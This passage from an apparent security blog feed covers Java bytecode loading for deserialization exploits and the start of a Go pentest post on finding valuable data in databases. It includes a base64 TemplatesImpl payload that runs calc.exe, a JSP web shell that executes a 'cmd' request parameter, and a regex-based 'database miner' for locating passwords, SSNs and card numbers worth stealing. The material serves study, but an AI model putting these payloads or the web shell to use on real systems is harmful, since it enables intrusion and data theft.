class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTGNvbS9DYWxjOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHACYBAApTb3VyY2VGaWxlAQAJQ2FsYy5qYXZhDAAZABoHACcMACgAKQEACGNhbGMuZXhlDAAqACsBAAhjb20vQ2FsYwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAADwALAAAAIAADAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABAAEQACABIAAAAEAAEAEwABAAcAFAACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAFAALAAAAKgAEAAAAAQAMAA0AAAAAAAEADgAPAAEAAAABABUAFgACAAAAAQAXABgAAwASAAAABAABABMAAQAZABoAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAWAAQAFwANABgACwAAAAwAAQAAAA4ADAANAAAAEgAAAAQAAQAbAAEAHAAAAAIAHQ==&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] byteCode = Base64.getDecoder().decode(code);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// _bytecodes 是由字节码组成的数组</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(obj, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// _name 可以是任意字符串，只要不为 null 即可</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(obj, <span class="string">&quot;Calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 固定写法</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_tfactory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        _tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _tfactory.set(obj, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        </span><br><span class="line">        obj.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>TemplatesImpl</code> 中对加载的字节码是有一定要求的：这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类</p><p>于是我们可以编写这样一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="shiro中的利用"><a href="#shiro中的利用" class="headerlink" title="shiro中的利用"></a>shiro中的利用</h3><p>具体可以看p师傅的《Java安全漫谈 - 15.TemplatesImpl在Shiro 中的利用》</p><p>其中<code>TemplatesImpl</code>的初始化可以简化为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;<span class="string">&quot;...bytescode&quot;</span>&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure><h2 id="0x06-VersionHelper"><a href="#0x06-VersionHelper" class="headerlink" title="0x06 VersionHelper"></a>0x06 VersionHelper</h2><p>直接写到临时文件下，然后进行加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">jarPath</span> <span class="operator">=</span> tmp + File.separator + <span class="string">&quot;Evil.class&quot;</span>;</span><br><span class="line">    Files.write(Paths.get(jarPath), Base64.getDecoder().decode(<span class="string">&quot;BASE64_BYTECODE&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">VersionHelper</span> <span class="variable">helper</span> <span class="operator">=</span> VersionHelper.getVersionHelper();</span><br><span class="line">    Class&lt;?&gt; clazz = helper.loadClass(<span class="string">&quot;Evil&quot;</span>, <span class="string">&quot;file:&quot;</span> + tmp + File.separator);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cmd);</span><br><span class="line">    response.getWriter().print(obj);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">对java加载字节码的一个学习</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(七)</title>
    <link href="https://h0ld1rs.github.io/posts/166.html"/>
    <id>https://h0ld1rs.github.io/posts/166.html</id>
    <published>2022-03-05T12:31:26.000Z</published>
    <updated>2022-03-07T08:56:42.520Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试学习笔记-七-–滥用数据库和文件系统"><a href="#Go渗透测试学习笔记-七-–滥用数据库和文件系统" class="headerlink" title="Go渗透测试学习笔记(七)–滥用数据库和文件系统"></a>Go渗透测试学习笔记(七)–滥用数据库和文件系统</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在本节，我们学习如何安装和配置各种<code>SQL</code>和<code>NOSQL</code>数据库，并学习如何通过<code>Go</code>来进行交互。</p><h2 id="0x01-与Mongo交互"><a href="#0x01-与Mongo交互" class="headerlink" title="0x01 与Mongo交互"></a>0x01 与Mongo交互</h2><h3 id="1-安装MongoDB数据库然后写入数据"><a href="#1-安装MongoDB数据库然后写入数据" class="headerlink" title="1. 安装MongoDB数据库然后写入数据"></a>1. 安装<code>MongoDB</code>数据库然后写入数据</h3><p>MongoDB是<code>NOSQL</code>数据库，这意味着，他与其他传统数据库不同，他是无架构的。</p><p>使用docker开启了之后，使用<code>store</code>数据库</p><blockquote><p>db.use strore</p></blockquote><p>然后写入数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">db.transactions.insert([</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccnum&quot;</span>: <span class="string">&quot;4444333322221111&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span>: <span class="string">&quot;2019-01-05&quot;</span>,</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: <span class="number">100.12</span>,</span><br><span class="line">    <span class="string">&quot;cvv&quot;</span>: <span class="string">&quot;1234&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;09/2020&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccnum&quot;</span>: <span class="string">&quot;4444123456789012&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span>: <span class="string">&quot;2019-01-07&quot;</span>,</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: <span class="number">2400.18</span>,</span><br><span class="line">    <span class="string">&quot;cvv&quot;</span>: <span class="string">&quot;5544&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;02/2021&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccnum&quot;</span>: <span class="string">&quot;4465122334455667&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span>: <span class="string">&quot;2019-01-29&quot;</span>,</span><br><span class="line">    <span class="string">&quot;amount&quot;</span>: <span class="number">1450.87</span>,</span><br><span class="line">    <span class="string">&quot;cvv&quot;</span>: <span class="string">&quot;9876&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="string">&quot;06/2020&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h3 id="2-下载包并写入代码"><a href="#2-下载包并写入代码" class="headerlink" title="2. 下载包并写入代码"></a>2. 下载包并写入代码</h3><p>需要先下载包，因为官方没有与<code>NoSQL</code>直接交互的包，</p><p>所以我们安装如下mongo的驱动：<code>go get gopkg.in/mgo.v2</code></p><p>然后写入以下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"></span><br><span class="line">mgo <span class="string">&quot;gopkg.in/mgo.v2&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">CCNum      <span class="type">string</span>  <span class="string">`bson:&quot;ccnum&quot;`</span></span><br><span class="line">Date       <span class="type">string</span>  <span class="string">`bson:&quot;date&quot;`</span></span><br><span class="line">Amount     <span class="type">float32</span> <span class="string">`bson:&quot;amount&quot;`</span></span><br><span class="line">Cvv        <span class="type">string</span>  <span class="string">`bson:&quot;cvv&quot;`</span></span><br><span class="line">Expiration <span class="type">string</span>  <span class="string">`bson:&quot;exp&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">session, err := mgo.Dial(<span class="string">&quot;192.168.68.137&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"></span><br><span class="line">results := <span class="built_in">make</span>([]Transaction, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> err := session.DB(<span class="string">&quot;store&quot;</span>).C(<span class="string">&quot;transactions&quot;</span>).Find(<span class="literal">nil</span>).All(&amp;results); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, txn := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Println(txn.CCNum, txn.Date, txn.Amount, txn.Cvv, txn.Expiration)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220307112853.png"></p><h2 id="0x02与mysq交互"><a href="#0x02与mysq交互" class="headerlink" title="0x02与mysq交互"></a>0x02与mysq交互</h2><h3 id="1-创建mysql-数据库，并且写入数据"><a href="#1-创建mysql-数据库，并且写入数据" class="headerlink" title="1.创建mysql 数据库，并且写入数据"></a>1.创建mysql 数据库，并且写入数据</h3> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database store;</span><br><span class="line">mysql&gt; create table  transactions(</span><br><span class="line">    -&gt; ccnum varchar(32),</span><br><span class="line">    -&gt; date date,</span><br><span class="line">    -&gt; amount decimal(7,2),</span><br><span class="line">    -&gt; cvv char(4),</span><br><span class="line">    -&gt; exp date);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444333322221111&#x27;</span>, <span class="string">&#x27;2019-01-05&#x27;</span>, <span class="number">100.12</span>, <span class="string">&#x27;1234&#x27;</span>, <span class="string">&#x27;2020-09-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444123456789012&#x27;</span>, <span class="string">&#x27;2019-01-07&#x27;</span>, <span class="number">2400.18</span>, <span class="string">&#x27;5544&#x27;</span>, <span class="string">&#x27;2021-02-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4465122334455667&#x27;</span>, <span class="string">&#x27;2019-01-29&#x27;</span>, <span class="number">1450.87</span>, <span class="string">&#x27;9876&#x27;</span>, <span class="string">&#x27;2020-06-01&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-编写代码"><a href="#2-编写代码" class="headerlink" title="2. 编写代码"></a>2. 编写代码</h3><p><code>Go</code>包包含了一个<code>database/sql</code>的标准包</p><p><code>go get github.com/go-sql-driver/mysql</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;database/sql&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"></span><br><span class="line">_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">db,err := sql.Open(<span class="string">&quot;mysql&quot;</span>,<span class="string">&quot;root:root@tcp(127.0.0.1:3306)/store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ccnum,date,cvv,exp <span class="type">string</span></span><br><span class="line">amount  <span class="type">float32</span></span><br><span class="line">)</span><br><span class="line">rows,err := db.Query(<span class="string">&quot;SELECT ccnum,date,amount,cvv,exp FROM transactions &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">err := rows.Scan(&amp;ccnum,&amp;date,&amp;amount,&amp;cvv,&amp;exp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(ccnum,date,cvv,exp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> rows.Err() != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要引入匿名包，否则加载不了数据库的驱动</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220307155811.png"></p><h2 id="0x03-构建数据库矿工"><a href="#0x03-构建数据库矿工" class="headerlink" title="0x03 构建数据库矿工"></a>0x03 构建数据库矿工</h2><p>在本节中，我们将创建一个工具来检查数据库模式(例如列明)，以确定其中的数据是否值得窃取。</p><h3 id="1-首先实现一个接口"><a href="#1-首先实现一个接口" class="headerlink" title="1. 首先实现一个接口"></a>1. 首先实现一个接口</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DatabaseMiner <span class="keyword">interface</span> &#123;</span><br><span class="line">GetSchema() (*Schema, <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Schema <span class="keyword">struct</span> &#123;</span><br><span class="line">Databases []Database</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Database <span class="keyword">struct</span> &#123;</span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Tables []Table</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Table <span class="keyword">struct</span> &#123;</span><br><span class="line">Name    <span class="type">string</span></span><br><span class="line">Columns []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(m DatabaseMiner)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">s, err := m.GetSchema()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">re := getRegex()</span><br><span class="line"><span class="keyword">for</span> _, database := <span class="keyword">range</span> s.Databases &#123;</span><br><span class="line"><span class="keyword">for</span> _, table := <span class="keyword">range</span> database.Tables &#123;</span><br><span class="line"><span class="keyword">for</span> _, field := <span class="keyword">range</span> table.Columns &#123;</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> re &#123;</span><br><span class="line"><span class="keyword">if</span> r.MatchString(field) &#123;</span><br><span class="line">fmt.Println(database)</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, field)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getRegex</span><span class="params">()</span></span> []*regexp.Regexp &#123;</span><br><span class="line"><span class="keyword">return</span> []*regexp.Regexp&#123;</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)social`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ssn`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)pass(word)?`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)hash`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)ccnum`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)card`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)security`</span>),</span><br><span class="line">regexp.MustCompile(<span class="string">`(?i)key`</span>),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Schema)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> ret <span 